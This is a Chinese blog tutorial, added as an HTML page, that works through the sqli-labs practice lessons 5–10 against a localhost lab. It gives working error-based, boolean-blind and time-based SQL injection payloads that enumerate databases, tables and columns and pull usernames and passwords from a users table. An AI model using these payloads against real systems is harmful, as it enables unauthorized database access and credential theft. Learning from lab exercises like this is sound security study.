@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      SQL注入（二） | Eris0s 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="Eris0s">
+    
+    
+
+    <meta name="description" content="0x01 简介上一篇文章介绍了最基本的注入方法，通过页面的报错信息和页面的返回值来猜测SQL语句并通过修改SQL语句将我们想要知道的信息显示在页面不同的位置上从而进行绕过达到注入的目的。那么要是通过union select 1,2,3无法将查询的信息返回在页面的相应位置上或者根本就没有报错信息是应该如何处理呢。所以我们要通过其他的注入方式去进行注入，即为==内联使注入（多重注入)== 和==盲注=">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入（二） | Eris0s">
+<meta property="og:url" content="http://yoursite.com/2017/11/04/SQL注入（二）/index.html">
+<meta property="og:site_name" content="Eris0s">
+<meta property="og:description" content="0x01 简介上一篇文章介绍了最基本的注入方法，通过页面的报错信息和页面的返回值来猜测SQL语句并通过修改SQL语句将我们想要知道的信息显示在页面不同的位置上从而进行绕过达到注入的目的。那么要是通过union select 1,2,3无法将查询的信息返回在页面的相应位置上或者根本就没有报错信息是应该如何处理呢。所以我们要通过其他的注入方式去进行注入，即为==内联使注入（多重注入)== 和==盲注=">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://note.youdao.com/yws/api/personal/file/FA297BF8B1C64065990CAD075EB117BF?method=download&shareKey=7629857c8cb4573a5f7fb3c05364b0a2">
+<meta property="og:image" content="http://note.youdao.com/yws/api/personal/file/1ABDB6E97DB84DE49D0F0AB0C19C62C2?method=download&shareKey=c75c8c0ccacc7f6246204ad33e5d0331">
+<meta property="og:updated_time" content="2017-11-04T08:44:29.171Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入（二） | Eris0s">
+<meta name="twitter:description" content="0x01 简介上一篇文章介绍了最基本的注入方法，通过页面的报错信息和页面的返回值来猜测SQL语句并通过修改SQL语句将我们想要知道的信息显示在页面不同的位置上从而进行绕过达到注入的目的。那么要是通过union select 1,2,3无法将查询的信息返回在页面的相应位置上或者根本就没有报错信息是应该如何处理呢。所以我们要通过其他的注入方式去进行注入，即为==内联使注入（多重注入)== 和==盲注=">
+<meta name="twitter:image" content="http://note.youdao.com/yws/api/personal/file/FA297BF8B1C64065990CAD075EB117BF?method=download&shareKey=7629857c8cb4573a5f7fb3c05364b0a2">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+        <a href="/" title="link to homepage for Eris0s"><img src="http://ww1.sinaimg.cn/bmiddle/00633F4mgy1fjw5uiqwf6j30hs0hsab9.jpg" width="80" alt="Eris0s logo" class="panel-cover__logo logo" /></a>
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Eris0s</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          欢迎来到信息安全小白的BLOG
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/eris0s" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    <!--
+    
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">Douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+    -->
+
+
+
+  </ul>
+</nav>
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">SQL注入（二）</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-11-04" class="post-meta__date date">2017-11-04</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a><center>0x01 简介</center></h2><p>上一篇文章介绍了最基本的注入方法，通过页面的报错信息和页面的返回值来猜测SQL语句并通过修改SQL语句将我们想要知道的信息显示在页面不同的位置上从而进行绕过达到注入的目的。那么要是通过union select 1,2,3无法将查询的信息返回在页面的相应位置上或者根本就没有报错信息是应该如何处理呢。<br><br>所以我们要通过其他的注入方式去进行注入，即为==内联使注入（多重注入)== 和==盲注== 。下面通过sqlilbas的less-5到less-10进行讲解。</p>
+<hr>
+<h2 id="0x02-Less-5——Less-6内联式注入"><a href="#0x02-Less-5——Less-6内联式注入" class="headerlink" title="0x02 Less-5——Less-6内联式注入"></a><center>0x02 Less-5——Less-6内联式注入</center></h2><p>按照正常的步骤，我们先输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1</div></pre></td></tr></table></figure></p>
+<p>页面返回正常，如图：<br><img src="http://note.youdao.com/yws/api/personal/file/FA297BF8B1C64065990CAD075EB117BF?method=download&amp;shareKey=7629857c8cb4573a5f7fb3c05364b0a2" alt="less-5-1"></p>
+<p>发现，这次并不是像前几关一样，输入id后把username和password返回到页面上，而是单独返回一个You are in….从这个页面中我们无法得到任何信息。接着我们进行下一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">?id=1&apos;</div><div class="line">发现报错了，报错信息为</div><div class="line">near &apos;   &apos;   1&apos;   &apos; LIMIT 0,1   &apos; at line 1</div><div class="line">所以我们猜测SQL语句为</div><div class="line">SELECT * FROM table_name WHERE id=&apos;input&apos;</div><div class="line">使用注释法</div><div class="line">?id=&apos;  1&apos; and 1=1%23  &apos;</div><div class="line"></div><div class="line">?id=&apos;  1&apos; order by 3%23  &apos;</div><div class="line"></div><div class="line">?id=&apos;  1&apos; union select 1,2,3%23  &apos;</div></pre></td></tr></table></figure></p>
+<p><img src="http://note.youdao.com/yws/api/personal/file/1ABDB6E97DB84DE49D0F0AB0C19C62C2?method=download&amp;shareKey=c75c8c0ccacc7f6246204ad33e5d0331" alt="Less-5-2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">发现页面并不返回查询的1,2,3！！！这是我们要换一种查询方式，我自己把它叫做多重查询这种方法一般是在页面没有显示位、</div><div class="line">但用echo mysql_error()输出了错误信息的时候使用，它的特点是注入速度快，但是语句较复杂,不能用group_concat(),</div><div class="line">只能用limit依次猜解</div></pre></td></tr></table></figure>
+<p>在注入之前我们要先了解几个注入需要用到的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">floor()是取整数</div><div class="line">rand()在0和1之间产生一个随机数</div><div class="line">rand(0)*2将取0到2的随机数</div><div class="line">floor(rand()*2)有两条记录就会报错</div><div class="line">floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</div><div class="line">count(*)是用来统计结果的，相当于刷新一次结果</div><div class="line">group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1</div><div class="line">在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</div></pre></td></tr></table></figure>
+<p>在对这些函数有了一定的了解之后，我们要开始注入大法了！！！<br>注入的第一步我们要先知道数据库的名称，但是并不是只有一个数据库所以要知道数据库的名称我们要先知道它是第几个数据库，因此我要知道数据库的个数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">构造SQL语句得到数据库个数//为了更加直观的解释SQL语句，我把SQL语句分段了</div><div class="line">?id=1&apos; union select 1 from ( select </div><div class="line">count(*)</div><div class="line">			,concat(</div><div class="line">				(select </div><div class="line">					(select concat</div><div class="line">						(0x7e7e3a7e7e,count</div><div class="line">							(distinct table_schema),0x7e7e3a7e7e</div><div class="line">						)from information_schema.tables </div><div class="line">					)</div><div class="line">				),floor(rand(0)*2))x from information_schema.tables group by x)a%23</div></pre></td></tr></table></figure>
+<p>得到一共==有7个数据库==，接下来我们要一个数据库一个数据库的进行查看，猜测可能存在信息的数据库。这里就不一一猜测了，直接得到结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(0x7e7e3a7e7e,table_schema,0x7e7e3a7e7e)from information_schema.tables limit 5,1)),floor(rand(0)*2))x from information_schema.tables group by x)a%23</div><div class="line"></div><div class="line">注意这里得到数据库的方式是通过修改limit后的参数，如limit 1,1  limit 2,1  limit 3,1</div></pre></td></tr></table></figure>
+<p>得到数据库的名称是==security==，下面要对security数据库中的表进行猜测，还是同样的思路，先猜测表的数量，再依次通过修改limit查看表名，看是否含有有用的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//查看表的数量——有4个表</div><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(0x7e7e3a7e7e,count(table_name),0x7e7e3a7e7e)from information_schema.tables where table_schema=&apos;security&apos;)),floor(rand(0)*2))x from information_schema.tables group by x)a%23</div><div class="line"></div><div class="line">//爆出表的名称——有信息的users表</div><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(0x7e7e3a7e7e,table_name,0x7e7e3a7e7e)from information_schema.tables where table_schema=&apos;security&apos; limit 3,1)),floor(rand(0)*2))x from information_schema.tables group by x)a%23</div></pre></td></tr></table></figure>
+<p>得到了==users==表，接下来我们要猜测表中的列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//爆出表中列的数量——3个列</div><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e)from information_schema.columns where table_name=&apos;users&apos; and table_schema=&apos;security&apos;)),floor(rand(0)*2))x from information_schema.tables group by x)a%23</div><div class="line"></div><div class="line">//爆出列的名字——username和password列</div><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e)from information_schema.columns where table_name=&apos;users&apos; and table_schema=&apos;security&apos; limit 1,1)) ,floor(rand(0)*2))x from information_schema.tables group by x)a%23</div><div class="line"></div><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e)from information_schema.columns where table_name=&apos;users&apos; and table_schema=&apos;security&apos; limit 2,1)) ,floor(rand(0)*2))x from information_schema.tables group by x)a%23</div></pre></td></tr></table></figure></p>
+<p>得到了字段==usrname==和==password==，那么我们可以爆出字段的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//得到字段内容</div><div class="line">?id=1&apos; union select 1 from (select count(*),concat((select(select distinct concat(username,&apos;:&apos;,password,&apos;:&apos;)from security.users limit 0,1)) ,floor(rand(0)*2))x from information_schema.tables group by x)a%23</div></pre></td></tr></table></figure>
+<h3 id="注意！！！"><a href="#注意！！！" class="headerlink" title="==注意！！！=="></a>==注意！！！==</h3><ol>
+<li>所有报信息的操作都是通过修改limit操作实现的</li>
+<li>SQL语句的结构</li>
+<li>判断SQL语句的正确格式</li>
+</ol>
+<p><br><br>Less-6的注入过程与Less-5基本一样，唯一的区别是Less-6的的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM table_name WHERE id=&quot;input&quot;</div></pre></td></tr></table></figure>
+<p>其他步骤参照上面的过程即可。</p>
+<hr>
+<h2 id="0x03-Less-8——Less-10盲注"><a href="#0x03-Less-8——Less-10盲注" class="headerlink" title="0x03 Less-8——Less-10盲注"></a><center>0x03 Less-8——Less-10盲注</center></h2><h4 id="盲注简介："><a href="#盲注简介：" class="headerlink" title="盲注简介："></a>盲注简介：</h4><p>盲注是注入的一种，它的意思是不知道数据库具体的返回值的情况下对数据库中的内容进行猜解，实施SQL注入。一般分为 ==基于布尔==和==基于时间==类型的盲注。</p>
+<h4 id="如何判断是盲注："><a href="#如何判断是盲注：" class="headerlink" title="如何判断是盲注："></a>如何判断是盲注：</h4><p>盲注没有错误信息的提示，一般只有T或F两种页面之一</p>
+<h4 id="盲注需要用到的函数："><a href="#盲注需要用到的函数：" class="headerlink" title="盲注需要用到的函数："></a>盲注需要用到的函数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">length(str)：返回str字符串的长度。</div><div class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</div><div class="line">mid(str,pos,len):跟上面的一样，截取字符串</div><div class="line">ascii(str)：返回字符串str的最左面字符的ASCII代码值。</div><div class="line">ord(str):同上，返回ascii码</div><div class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</div><div class="line">要记得常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57</div></pre></td></tr></table></figure>
+<h3 id="Less-8-布尔型盲注"><a href="#Less-8-布尔型盲注" class="headerlink" title="Less-8 布尔型盲注"></a><center>Less-8 布尔型盲注</center></h3><p>开始注入，首先猜测SQL语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">在 id 参数后面加上 &apos; ，返回页面错误，而加上 &quot; 返回页面正确</div><div class="line">这就说明了 &apos; 应该是sql 语句的一部分，可以猜测 sql语句为：</div><div class="line">select * from table where id = &apos;input&apos;</div><div class="line">构造SQL语句:</div><div class="line">?id=1&apos; and 1=1%23</div><div class="line">页面返回正确，说明我们猜测的SQL语句是对的</div></pre></td></tr></table></figure>
+<p>首先select database()查询数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码</div><div class="line">ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0</div></pre></td></tr></table></figure></p>
+<p>构造SQL语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//判断数据库名称的字母个数</div><div class="line">?id=1&apos; and length(database())=8%23</div><div class="line">//判断数据库名称</div><div class="line">?id=1&apos; and if(ascii(substr((select database()),1,1))&gt;64,1,0)%23</div><div class="line">或者简单一点</div><div class="line">?id=1&apos; and ascii(substr((select database()),1,1))&gt;64 %23</div></pre></td></tr></table></figure></p>
+<p>盲注的过程很繁琐，下面为判断数据库名称第一个字母的过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)&gt;64 %23 返回正确，大于64  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;96 %23 返回正确，大于96  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间  </div><div class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s</div><div class="line"></div><div class="line">通过修改limit参数依次判断数据库名称的字母是什么</div><div class="line"></div><div class="line">database() 位置可以替换成 更复杂的 查询语句：</div><div class="line">(select table_name from information_schema.tables where table_schema=database() limit 0,1)</div></pre></td></tr></table></figure>
+<h3 id="Less-9-时间型盲注"><a href="#Less-9-时间型盲注" class="headerlink" title="Less-9 时间型盲注"></a><center>Less-9 时间型盲注</center></h3><p>按照正常的步骤对id进行赋值，但是发现不管是数字还是经典的  ‘ , \ , “  , ‘) ,’)) , “) , “)) 都没用，返回页面全是一样的，全部返回You are in…….这时，我们可以通过时间函数sleep()对页面显示的时间进行设置，通过时间的长短来推测SQL语句是否正确。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">我们推测SQL语句为：</div><div class="line">select * from table where id = input</div><div class="line">构造语句：</div><div class="line">?id=1 and (select sleep(3))</div><div class="line">//如果返回页面需要等待4秒的话，就表示我们的猜测正确，返回时间通过火狐插件F12查看，等待3秒，显示1秒，一共4秒</div></pre></td></tr></table></figure>
+<p>返回页面没有等待4秒就出来了，说明猜测错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">再次猜测SQL语句：</div><div class="line">select * from table where id = &apos;input&apos;</div><div class="line">再次验证：</div><div class="line">?id=1 and (select sleep(3))%23</div><div class="line">返回页面用时4秒钟，SQL语句猜测正确</div></pre></td></tr></table></figure>
+<p>其余过程基本与布尔型盲注一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">构造SQL语句：</div><div class="line">?id=1&apos; and (select if(ascii(substr(database(),1,1)) &gt; 100,sleep(3),NULL))%23</div><div class="line">/*如果当前数据库的第一个字母的ascii码是大于100的，那么返回页面就会等待3秒才反馈，否则不是*/</div><div class="line">剩下的过程参考布尔型盲注</div></pre></td></tr></table></figure>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a><center>0x04 总结</center></h2><p>内联式注入和盲注都是SQL注入中常见的注入方式，本文只是对这两种注入方式进行总结，希望大佬们多多指导</p>
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a><center>END</center></h2>
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+	
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017. | Hello World | <a href="https://www.eris0s.club">Eris0s</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
